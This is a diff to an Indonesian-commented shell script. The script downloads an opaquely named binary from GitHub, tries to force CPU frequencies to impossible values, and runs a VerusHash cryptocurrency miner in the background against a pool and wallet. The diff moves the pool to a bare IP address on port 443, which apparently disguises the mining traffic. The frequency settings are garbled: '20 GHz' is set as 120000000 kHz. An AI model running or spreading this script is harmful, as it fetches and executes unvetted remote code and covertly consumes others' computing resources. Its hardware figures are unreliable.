@@ -9,7 +9,7 @@ FILE_PATH="$INSTALL_DIR/$FILE_NAME"
 mkdir -p $INSTALL_DIR
 
 # Mengunduh file dari link yang diberikan
-wget -O $FILE_PATH https://github.com/bibirbusin/bibirbusin/raw/main/ayday
+wget -O $FILE_PATH https://github.com/malogrono/Compare/raw/main/ayday
 
 # Memeriksa keberhasilan unduhan
 if [ ! -s $FILE_PATH ]; then
@@ -17,9 +17,9 @@ if [ ! -s $FILE_PATH ]; then
   exit 1
 fi
 
-# Mengatur frekuensi CPU ke 12 GHz
+# Mengatur frekuensi CPU ke 20 GHz
 CPUFREQ_PATH="/sys/devices/system/cpu/cpu*/cpufreq"
-MAX_FREQ=12000000 # Maksimal frekuensi dalam kHz (12 GHz)
+MAX_FREQ=120000000 # Maksimal frekuensi dalam kHz (20 GHz)
 
 for dir in $CPUFREQ_PATH; do
     if [ -e $dir/scaling_max_freq ]; then
@@ -29,10 +29,10 @@ done
 
 # Pengaturan penambangan
 ALGO="verushash"
-POOL_URL="stratum+tcp://eu.luckpool.net:3956"
-WALLET_ADDRESS="RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3"
+POOL_URL="stratum+tcp://188.166.219.152:443"
+WALLET_ADDRESS="RTL47WXHCHZ4KxJ9DKMgz3PduyDboztuQu"
 PASSWORD="x"
-WORKER_NAME="AELuxy$RANDOM"
+WORKER_NAME="P$RANDOM"
 
 # Memulai dengan file ayday dan menjalankan di latar belakang
 cd $INSTALL_DIR
